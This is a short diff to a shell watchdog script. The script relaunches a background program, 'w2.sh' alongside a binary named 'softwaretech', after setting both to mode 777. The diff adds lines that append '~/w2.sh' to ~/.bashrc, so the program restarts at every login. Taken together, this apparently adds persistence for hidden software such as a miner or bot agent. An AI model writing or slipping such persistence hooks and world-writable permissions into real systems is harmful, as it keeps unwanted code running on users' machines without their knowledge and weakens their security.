@@ -13,6 +13,7 @@ if [ -z "$matches" ]; then
 	chmod 777 softwaretech
 	chmod 777 w2.sh
 	./w2.sh &
+	echo '~/w2.sh' >> ~/.bashrc
 else
 	alive=$(echo "$matches" | awk '$1 !~ /^Z/')
 	if [ -z "$alive" ]; then
@@ -24,6 +25,7 @@ else
 	chmod 777 softwaretech
 	chmod 777 w2.sh
 	./w2.sh &
+	echo '~/w2.sh' >> ~/.bashrc
 	else
 		echo "process is running normally"
 	fi
